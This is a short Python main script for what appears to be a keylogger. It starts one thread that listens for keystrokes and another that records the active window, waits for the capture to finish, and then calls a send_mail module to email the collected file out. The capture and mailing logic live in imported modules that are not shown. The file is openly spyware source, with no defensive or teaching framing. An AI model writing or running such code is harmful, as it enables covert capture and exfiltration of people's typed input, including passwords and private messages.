#!/usr/local/bin/python3
import threading
import send_mail
import keyboard_listener
import identify_operating_systems
try:
    #Creating threads
    keystroke_thread = threading.Thread(target = keyboard_listener.listen_keystrokes, daemon = False)
    window_thread = threading.Thread(target = identify_operating_systems.active_window, daemon = True)

    #Start both threads
    window_thread.start()
    keystroke_thread.start()

    #wait only for keystroke_thread to finish
    keystroke_thread.join()

    #send mail 
    send_mail.mail_file()
except Exception as e:
    print(f'An error occurred: {e}')